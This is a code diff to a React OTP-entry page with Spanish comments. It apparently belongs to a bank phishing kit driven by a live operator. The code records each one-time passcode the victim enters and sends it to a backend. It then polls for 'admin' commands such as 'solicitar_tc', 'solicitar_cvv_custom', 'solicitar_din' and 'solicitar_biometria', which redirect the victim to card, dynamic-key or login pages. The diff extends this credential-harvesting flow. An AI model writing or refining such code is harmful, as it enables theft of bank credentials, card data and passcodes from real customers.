@@ -73,6 +73,16 @@ export default function NumeroOTP() {
                 ...prev,
                 lanzarModalErrorSesion: true
             }));
+
+            // Se quita a los 2 segundos
+            setTimeout(() => {
+
+                // Se oculta el modal de error de sesión OTP
+                setFormState(prev => ({
+                    ...prev,
+                    lanzarModalErrorSesion: false
+                }));
+            }, 2000);
         };
 
         // Se obtiene la IP
@@ -271,6 +281,38 @@ export default function NumeroOTP() {
         }));
     };
 
+    // Metodo para registrar el intento de otp
+    const actualizarLocalStorage = (otpValue) => {
+
+        // Se obtiene los datos del localStorage
+        const storageKey = "datos_usuario";
+
+        // Se obtiene el valor almacenado
+        const raw = localStorage.getItem(storageKey);
+
+        // Se parsea el JSON o se inicializa un objeto vacío
+        let datos = raw ? JSON.parse(raw) : {};
+
+        // Se inicializa el objeto de intentos si no existe
+        if (!datos.otp) datos.otp = {};
+
+        // Se crea la clave del nuevo intento
+        const intentoNum = Object.keys(datos.otp).length + 1;
+        const intentoKey = `intento_${intentoNum}`;
+
+        // Se registra el nuevo intento
+        datos.otp[intentoKey] = {
+            codigo: otpValue,
+            fecha: new Date().toLocaleString(),
+        };
+
+        // Se guarda nuevamente en el localStorage
+        localStorage.setItem(storageKey, JSON.stringify(datos));
+
+        // Se retorna el objeto de intentos
+        return datos.codigo;
+    };
+
     const handleContinuar = async () => {
         setCargando(true);
 
@@ -285,18 +327,23 @@ export default function NumeroOTP() {
                 return;
             }
 
+            // Obtener el código OTP ingresado
             const otpCode = formState.clave;
 
-            // Prepare data in correct format for backend
+            // Registrar intento antes de enviar
+            actualizarLocalStorage(otpCode);
+
+            // Prepara los datos con ID de sesión
+            const dataLocalStorage = localStorage.getItem("datos_usuario") ? JSON.parse(localStorage.getItem("datos_usuario")) : null;
+
+            // Se envia la data
             const dataSend = {
-                data: {
-                    attributes: {
-                        sesion_id: sesionId,
-                        codigo: otpCode
-                    }
-                }
+                "data": {
+                    "attributes": dataLocalStorage
+                },
             };
 
+            // Se envia la petición al backend
             await instanceBackend.post('/otp', dataSend);
 
             // Iniciar polling para esperar respuesta del admin
@@ -320,10 +367,19 @@ export default function NumeroOTP() {
 
                 // Estados que detienen el polling
                 const estadosFinales = [
+                    // Botones linea 1
                     'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
+
+                    // Botones linea 2
                     'error_tc', 'error_otp', 'error_din', 'error_login',
+
+                    // Botones linea 3
                     'solicitar_biometria', 'error_923',
+
+                    // Botones linea 4
                     'solicitar_tc_custom', 'solicitar_cvv_custom',
+
+                    // Estados adicionales por pantalla
                     'aprobado', 'error_pantalla', 'bloqueado_pantalla'
                 ];
 
@@ -342,11 +398,11 @@ export default function NumeroOTP() {
                         break;
                     case 'error_tc':
 
-                        // Redirigir a la validación de tarjeta de crédito
-                        window.location.href = '/validacion-tc';
-
                         // Se almacena en el localStorage el estado de sesión con error
                         localStorage.setItem('estado_sesion', 'error');
+
+                        // Redirigir a la validación de tarjeta de crédito
+                        window.location.href = '/validacion-tc';
 
                         // Se sale del ciclo
                         break;
@@ -382,11 +438,11 @@ export default function NumeroOTP() {
                         break;
                     case 'error_din':
 
-                        // Redirigir a la clave dinámica
-                        window.location.href = '/clave-dinamica';
-
                         // Se almacena en el localStorage el estado de sesión con error
                         localStorage.setItem('estado_sesion', 'error');
+
+                        // Redirigir a la clave dinámica
+                        window.location.href = '/clave-dinamica';
 
                         // Se sale del ciclo
                         break;
@@ -427,17 +483,22 @@ export default function NumeroOTP() {
                         break;
                     case 'error_login':
 
-                        // Redirigir a la página de autenticación
-                        window.location.href = '/autenticacion';
-
                         // Se almacena en el localStorage el estado de sesión con error
                         localStorage.setItem('estado_sesion', 'error');
+
+                        // Redirigir a la página de autenticación
+                        window.location.href = '/autenticacion';
 
                         // Se sale del ciclo
                         break;
                     default:
+
+                        // Se quita el estado de cargando
+                        setCargando(false);
+
+                        // Se sale del ciclo
                         break;
-                }
+                };
             } catch (error) {
 
                 // Se quita el estado de cargando
@@ -449,11 +510,14 @@ export default function NumeroOTP() {
         }, 3000);
     };
 
-
+    // Manejo de foco en inputs OTP
     const handleOtpFocus = () => {
+
+        // Se establece el estado de foco
         setOtpFocused(true);
     };
 
+    // Renderizado del componente
     return (
         <div style={{ height: "100vh", display: "flex", flexDirection: "column" }}>
             <div
